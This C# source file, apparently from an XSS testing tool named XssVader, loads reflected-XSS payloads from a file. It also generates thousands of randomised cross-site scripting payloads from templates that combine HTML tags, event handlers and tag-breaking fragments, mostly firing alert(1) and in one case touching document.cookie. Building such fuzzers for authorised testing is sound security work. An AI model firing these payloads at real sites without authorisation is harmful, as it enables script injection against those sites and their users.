using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using XssVader.Models;

namespace XssVader.Controllers
{
    internal class XssController
    {
        private readonly XssModel _xssReflected;
        private readonly XssModel _xssDOMBased;
        public XssController()
        {
            _xssReflected = new XssModel();
            _xssDOMBased = new XssModel();
        }

        public List<string> GetReflectedPayloads()
        {
            var projectDirectory = Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory)?
                .Parent?
                .Parent?
                .Parent?
                .FullName;

            _xssReflected.Type = "REFLECETED";
            _xssReflected.Description = "Reflected XSS payloads";

            if (projectDirectory == null)
            {
                throw new InvalidOperationException("Payloads could not be loaded.");
            }

            _xssReflected.Payloads = ReadPayloadFile(Path.Combine(projectDirectory, "Payloads", "p-reflected.txt"));
            
            List<string> randomPayloads = GenRandomPayloads();

            return randomPayloads;
        } 
        public List<string> ReadPayloadFile(string filePath)
        {
            if (File.Exists(filePath))
            {
                return File.ReadAllLines(filePath).ToList();
            }
            else
            {
                throw new FileNotFoundException("O arquivo especificado não foi encontrado.", filePath);
            }
        }
        public List<string> GenRandomPayloads()
        {
            string[] tags = {
                "a", "a2", "abbr", "acronym", "address", "animate", "animatemotion",
                "animatetransform", "applet", "area", "article", "aside", "audio",
                "audio2", "b", "bdi", "bdo", "big", "blink", "blockquote", "body",
                "br", "button", "canvas", "caption", "center", "cite", "code", "col",
                "colgroup", "command", "content", "custom tags", "data", "datalist",
                "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt",
                "element", "em", "embed", "fieldset", "figcaption", "figure", "font",
                "footer", "form", "frame", "frameset", "h1", "head", "header",
                "hgroup", "hr", "html", "i", "iframe", "iframe2", "image", "image2",
                "image3", "img", "img2", "input", "input2", "input3", "input4",
                "ins", "kbd", "keygen", "label", "legend", "li", "link", "listing",
                "main", "map", "mark", "marquee", "menu", "menuitem", "meta",
                "meter", "multicol", "nav", "nextid", "nobr", "noembed", "noframes",
                "noscript", "object", "ol", "optgroup", "option", "output", "p",
                "param", "picture", "plaintext", "pre", "progress", "q", "rb",
                "rp", "rt", "rtc", "ruby", "s", "samp", "script", "section",
                "select", "set", "shadow", "slot", "small", "source", "spacer",
                "span", "strike", "strong", "style", "sub", "summary", "sup",
                "svg", "table", "tbody", "td", "template", "textarea", "tfoot",
                "th", "thead", "time", "title", "tr", "track", "tt", "u", "ul",
                "var", "video", "video2", "wbr", "xmp"
            };
            string[] events = {
                "onafterprint", "onafterscriptexecute", "onanimationcancel",
                "onanimationend", "onanimationiteration", "onanimationstart",
                "onauxclick", "onbeforecopy", "onbeforecut", "onbeforeinput",
                "onbeforeprint", "onbeforescriptexecute", "onbeforetoggle",
                "onbeforeunload", "onbegin", "onblur", "oncancel", "oncanplay",
                "oncanplaythrough", "onchange", "onclick", "onclose",
                "oncontentvisibilityautostatechange",
                "oncontentvisibilityautostatechange(hidden)", "oncontextmenu",
                "oncopy", "oncuechange", "oncut", "ondblclick", "ondrag",
                "ondragend", "ondragenter", "ondragexit", "ondragleave",
                "ondragover", "ondragstart", "ondrop", "ondurationchange",
                "onend", "onended", "onerror", "onfocus", "onfocus(autofocus)",
                "onfocusin", "onfocusout", "onformdata", "onfullscreenchange",
                "onhashchange", "oninput", "oninvalid", "onkeydown",
                "onkeypress", "onkeyup", "onload", "onloadeddata",
                "onloadedmetadata", "onloadstart", "onmessage", "onmousedown",
                "onmouseenter", "onmouseleave", "onmousemove", "onmouseout",
                "onmouseover", "onmouseup", "onmousewheel", "onmozfullscreenchange",
                "onpagehide", "onpageshow", "onpaste", "onpause", "onplay",
                "onplaying", "onpointercancel", "onpointerdown", "onpointerenter",
                "onpointerleave", "onpointermove", "onpointerout", "onpointerover",
                "onpointerrawupdate", "onpointerup", "onpopstate", "onprogress",
                "onratechange", "onrepeat", "onreset", "onresize", "onscroll",
                "onscrollend", "onscrollsnapchange", "onsearch", "onseeked",
                "onseeking", "onselect", "onselectionchange", "onselectstart",
                "onshow", "onsubmit", "onsuspend", "ontimeupdate", "ontoggle",
                "ontoggle(popover)", "ontouchend", "ontouchmove", "ontouchstart",
                "ontransitioncancel", "ontransitionend", "ontransitionrun",
                "ontransitionstart", "onunhandledrejection", "onunload",
                "onvolumechange", "onwaiting", "onwaiting(loop)",
                "onwebkitanimationend", "onwebkitanimationiteration",
                "onwebkitanimationstart", "onwebkitfullscreenchange",
                "onwebkitmouseforcechanged", "onwebkitmouseforcedown",
                "onwebkitmouseforceup", "onwebkitmouseforcewillbegin",
                "onwebkitplaybacktargetavailabilitychanged",
                "onwebkitpresentationmodechanged", "onwebkittransitionend",
                "onwebkitwillrevealbottom", "onwheel"
            };

            string[] openStructure =
            {
                "//", "/*", "*/", "\">><", "<script>", "<img", "<iframe>", "<style>",
                "<svg>", "<audio>", "<video>", "<embed>", "<object>", "<link>", "<meta>",
                "<form", "<input>", "<textarea>", "<button>", "<select>", "<option>",
                "<table>", "<tr", "<td", "<th>", "<ul>", "<ol>", "<li>", "<a>", "<div>",
                "<span>", "<p>", "<blockquote>", "<h1>", "<h2>", "<sc", "scri", "scrip",
                "<im", "<ifram", "<tabl", "<ta>", "<tex>", "<texta", "<butto", "<sel",
                "<selec", "<opt", "<spa>", "<di>", "<for", "<foote", "<heade", "<link ",
                "<lin>", "<met", "<met>", "<met>", "<ta>", "<ifr", "<div", "<div ",
                "<spa", "<spa ", "<p>", "<p ", "<blo", "<blo", "<h1>", "<h1 ", "<h2>", "<h2 "
            };

            string[] payloadTemplates = {
                "{open}<{tag} {evt}=\"alert(1)\">",
                "<{tag} {evt} {open}{open}<{tag} {evt}=\"alert(1)\">{open}{open}{tag}",
                "{open}{evt}<{tag} {evt}=\"alert(1)\"",
                "<{tag} {evt}=\"{open}alert(1)\">",
                ">><{tag}><{tag}></{tag}><{tag}>{open}{open}{open}<{tag}  {evt}=\"javascript:alert(1)\">",
                "{open}<{tag} {evt}=\"{open}{evt}(1)\">",
                "<{tag} {evt}={open}alert('XSS')>",
                "{evt}<{tag} {evt}=\"{open}alert(1)\">",
                "<{tag} {evt}=\"javascript:{open}{evt}(1)\">",
                "{open}<{tag} {evt}=\"{evt}(1)\">",
                "{open}{evt}<{tag} {evt}=\"javascript:alert('Payload')\">",
                "<{tag} {evt}=\"{open}document.cookie\">",
                "{open}<{tag} {evt}=\"alert('Open')\">",
                "<{tag} {evt}={open}{evt}(\"payload\")>",
                "{open}{evt}{open}<{tag} {evt}=\"alert(1)\">",
                "<{tag} {evt}={open}  {evt}=alert(\"Payload\")>",
                " {evt}={open}<{tag}  {evt}=\"alert('XSS')\">",
                "{open}{tag}><{tag}  {evt}=\"javascript:alert('1')\"",
                "<{tag}  {evt}{open}<{tag}  {evt}=\"alert(1)\">",
                "{open} {evt}<{tag}  {evt}={open}\"alert(1)\"",
                "<{tag}  {evt}=\"alert(1);{open}\">",
                "{open}<{tag}  {evt}= {evt}/// {evt}=\"alert('Injected')\">",
                "<{tag}  {evt}={open}{open}alert(\"Exploit\")>",
                "{open} {evt}<{tag} ={open} {evt}=\"javascript:alert(1)\">",
                "{open}<{tag} = {evt}\"alert('Example')\">",
                "<{tag}  {evt}={open} {evt}(\"1\")>",
                " {evt}{open}<{tag} alert('Vulnerable')",
                "{open}<{tag} = {evt}\"{open} {evt}=prompt(1)\">",
                "{open}<{tag} alert('Injected')={open} {evt}=_=confirm`1`",
                "<{tag}  {evt}=\"javascript:{open} {evt}(1);\">",
                "{open} {evt}<{tag} {open}alert('Payload')",
                "<{tag}  {evt}={open} {evt}(1);alert('Another')>",
                "{open} {evt}{open}<{tag} {open}javascript:alert(1)>",
                "<{tag}  {evt}={open} {evt}\"{open}alert('XSS')\">",
                "{open}<{tag}  {evt}=\"javascript: {evt}(1)\">",
                " {evt}<{tag} {open}\"{open}alert('Execution')\">",
                "{open}<{tag} =\"javascript: {evt}(1)\">",
                "{open}<{tag}  {evt}={open}alert('Simple')>",
                "<{tag}  {evt}=\"javascript:{open} {evt}(1)\">",
                "{open} {evt}{open}<{tag} =\"javascript: {evt}(1)\">",
                "<{tag}  {evt}={open}\"alert('Value')\">",
                "{open}<{tag} = {evt}{open}=\"alert(' {evt}') {evt}=alert(//)\">",
                "<{tag}  {evt}={open} {evt}alert('Dynamic')>",
                "{open} {evt}={open}<{tag} alert(1)>",
                "<{tag}  {evt}=\"{open}alert(1)={open}\">",
                " {evt}{open}{open}<{tag} alert('Event')>",
                "{open} {evt}<{tag} {open}alert('Double')",
                "{open}<{tag} =\"javascript:{open} {evt}(1);\">",
                "{open} {evt}{open}<{tag} alert(' {evt}')>",
                "<{tag}   {evt}={open}\"alert('Extra')\">",
                "{open} {evt}<{tag} = {evt}\"alert('{open}')\">",
                "{open}<{tag}  {evt}=\"javascript:{open} {evt}(1)\">",
                " {evt}={open}<{tag} {open}alert(' {evt}')>",
                "{open}<{tag}  {evt}=\"{open} {evt}(1)\">",
                "{open}<{tag}  {evt}={open}\"alert(' {evt}')\">",
                "<{tag}  {evt}=\"{open} {evt}(1)\">",
                " {evt}{open}<{tag}  {evt}=\"javascript: {evt}(1);\">",
                "{open}<{tag} = {evt} {evt}=\"alert(' {evt}')\">",
                "<{tag}  {evt}={open}\"alert('{open}')\">",
                "{open} {evt}{open}<{tag} alert(' {evt}')>",
                " {evt}={open}<{tag} alert('{open}')",
                "{open}<{tag}  {evt}= {evt} {evt}=\"alert('{open}')\">",
                "<{tag}   {evt}=\"{open}javascript:alert(' {evt}')\">",
                "{open} {evt}<{tag} alert('Injection')",
                " {evt}{open}{open}<{tag} alert('Dynamic')",
                "{open}<{tag}  {evt}= {evt}\"alert(' {evt}')\">",
                "<{tag}  {evt}=\" {evt}{open}alert(1)\">",
                "{open}<{tag}  {evt}=\" {evt}\"{open}alert(1)>",
                "{open} {evt}{open}<{tag} javascript: {evt}(1);",
                "<{tag}  {evt}={open}\" {evt}\"{open}alert(1)>",
                " {evt}={open}<{tag}  {evt}=\"alert(' {evt}')\">",
                "{open}<{tag}  {evt}= {evt}alert('{open}')>",
                "{open} {evt}<{tag} \" {evt}{open}alert(1)>",
                "<{tag}  {evt}=\"{open}alert(' {evt}')\">",
                " {evt}={open}<{tag} alert(' {evt}')=\" {evt}\"",
                "{open}<{tag} =\"alert(' {evt}')\"={open} {evt}",
                "<{tag}  {evt}=\" {evt}\"{open}alert(' {evt}')>",
                "{open} {evt}{open}<{tag} alert(' {evt}')={open}",
                "<{tag}  {evt}=\"{open}alert(' {evt}')\">= {evt}",
                "{open}<{tag}  {evt}=\"alert('{open}')\">= {evt}",
                " {evt}{open}<{tag}  {evt}=alert(' {evt}')= {evt}",
                "{open}<{tag} \" {evt}={open}alert(' {evt}')\">",
                " {evt}={open}<{tag}  {evt}=\" {evt}\"{open}alert(1)>",
                "{open}<{tag}  {evt}=alert(' {evt}')= {evt}alert('{open}')",
                "<{tag}  {evt}=\"prompt(/ {evt}/)\"{open}alert(' {evt}')={open}"
            };

            
            Random random = new Random();
            List<string> generatedPayloads = new List<string>();

            for (int i = 0; i < 200; i++)
            {
                foreach (string template in payloadTemplates)
                {
                    string open = openStructure[random.Next(openStructure.Length)];
                    string tag = tags[random.Next(tags.Length)];
                    string evt = events[random.Next(events.Length)];

                    
                    string payload = template
                        .Replace("{open}", open)
                        .Replace("{tag}", tag)
                        .Replace("{evt}", evt);

                    generatedPayloads.Add(payload);
                }
            }

            return generatedPayloads;
        } 
    }
}
